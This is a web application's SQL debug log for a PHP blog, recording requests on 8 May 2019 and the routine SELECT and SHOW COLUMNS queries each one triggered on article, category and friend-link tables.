---------------------------------------------------------------
[2019-05-08T00:09:42+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000978s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001994s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000412s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001573s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000417s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001379s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000432s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000376s ]
---------------------------------------------------------------
[2019-05-08T00:18:59+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001020s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001933s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000675s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001476s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000471s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000369s ]
---------------------------------------------------------------
[2019-05-08T00:20:09+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001021s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001650s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000396s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001406s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000471s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001572s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000460s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000362s ]
---------------------------------------------------------------
[2019-05-08T02:30:51+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000953s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001613s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000376s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001329s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000475s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001557s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000431s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000374s ]
---------------------------------------------------------------
[2019-05-08T02:43:25+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001031s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001735s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000422s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001438s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000410s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001705s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000596s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000479s ]
---------------------------------------------------------------
[2019-05-08T03:27:17+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001706s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002177s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000376s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001553s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000493s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001401s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000475s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000424s ]
---------------------------------------------------------------
[2019-05-08T03:53:28+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001140s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002913s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000464s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001541s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000429s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001858s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000408s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000333s ]
---------------------------------------------------------------
[2019-05-08T03:53:55+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001232s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002152s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000516s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001803s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000808s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000795s ]
---------------------------------------------------------------
[2019-05-08T04:53:23+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001004s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001774s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000443s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001477s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000619s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001437s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000463s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000369s ]
---------------------------------------------------------------
[2019-05-08T04:53:47+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001510s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002336s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000570s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001715s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000512s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000614s ]
---------------------------------------------------------------
[2019-05-08T05:23:12+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001307s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001739s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000386s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001797s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000522s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001900s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000581s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000507s ]
---------------------------------------------------------------
[2019-05-08T05:33:18+08:00] 172.18.0.2 POST blog/index.php?g=Comment&m=Widget&a=fetch
[ sql ] [ DB ] CONNECT:[ UseTime:0.001243s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002062s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000381s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001255s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000382s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001283s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000404s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000360s ]
---------------------------------------------------------------
[2019-05-08T06:24:09+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001290s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001955s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000378s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001359s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000412s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001435s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000479s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000414s ]
---------------------------------------------------------------
[2019-05-08T06:58:59+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001223s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001784s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000390s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001390s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000405s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001401s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000440s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000358s ]
---------------------------------------------------------------
[2019-05-08T06:59:27+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000918s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001631s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000445s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001356s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000445s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000392s ]
---------------------------------------------------------------
[2019-05-08T07:31:02+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001390s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.003651s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000522s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001766s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000441s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001545s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000572s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000606s ]
---------------------------------------------------------------
[2019-05-08T07:33:46+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000965s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001749s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000420s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001375s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000435s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000376s ]
---------------------------------------------------------------
[2019-05-08T07:38:46+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001476s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002450s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000649s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002150s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000581s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000430s ]
---------------------------------------------------------------
[2019-05-08T09:55:11+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.584007s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.243200s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.012763s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002259s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.014990s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.015514s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.078394s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000851s ]
---------------------------------------------------------------
[2019-05-08T09:55:14+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001180s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001836s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.039869s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.003014s ]
---------------------------------------------------------------
[2019-05-08T10:06:52+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001390s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002091s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000572s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001873s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000516s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001729s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000588s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000521s ]
---------------------------------------------------------------
[2019-05-08T10:25:31+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001259s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001787s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000400s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001485s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000416s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001431s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000465s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000521s ]
---------------------------------------------------------------
[2019-05-08T10:25:34+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001226s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001945s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000528s ]
---------------------------------------------------------------
[2019-05-08T10:58:23+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001243s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002417s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000438s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001539s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000423s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002390s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000644s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000496s ]
---------------------------------------------------------------
[2019-05-08T10:58:24+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001181s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001864s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000401s ]
---------------------------------------------------------------
[2019-05-08T10:58:24+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.002497s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002665s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000612s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000702s ]
---------------------------------------------------------------
[2019-05-08T11:35:10+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001243s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002150s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000509s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001853s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000484s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001686s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000581s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000447s ]
---------------------------------------------------------------
[2019-05-08T11:41:48+08:00] 172.18.0.2 HEAD blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001245s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001926s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000508s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001610s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000553s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000524s ]
---------------------------------------------------------------
[2019-05-08T11:41:48+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001178s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002007s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000586s ]
---------------------------------------------------------------
[2019-05-08T11:50:10+08:00] 172.18.0.2 POST blog/index.php
[ sql ] [ DB ] CONNECT:[ UseTime:0.001005s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001969s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000470s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001482s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000448s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001607s ]
